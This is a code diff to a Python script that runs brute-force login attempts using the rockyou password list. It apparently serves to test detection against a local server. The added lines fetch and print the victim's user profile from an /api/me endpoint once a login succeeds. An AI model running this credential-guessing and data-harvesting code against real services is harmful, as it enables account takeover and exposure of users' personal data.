@@ -20,9 +20,13 @@ def load_creds(path, limit=None):
 passwords = load_creds("scripts/data/rockyou.txt", limit=5000)
 pool = itertools.cycle(passwords)
 
+# store the first successful /api/me response
+first_user_info = None
+
 
 def attack(rate_per_sec=10, attempts=50, use_jwt=False):
     """Send repeated login attempts and report detection results."""
+    global first_user_info
     success = 0
     blocked = 0
     for _ in range(attempts):
@@ -73,6 +77,19 @@ def attack(rate_per_sec=10, attempts=50, use_jwt=False):
 
         if login_ok:
             success += 1
+            if token:
+                try:
+                    resp = requests.get(
+                        "http://localhost:8001/api/me",
+                        headers={"Authorization": f"Bearer {token}"},
+                        timeout=3,
+                    )
+                    data = resp.json()
+                    if first_user_info is None:
+                        first_user_info = data
+                        print(f"Retrieved user data: {data}")
+                except Exception as e:
+                    print("USER INFO ERROR:", e)
 
         time.sleep(1 / rate_per_sec)
 
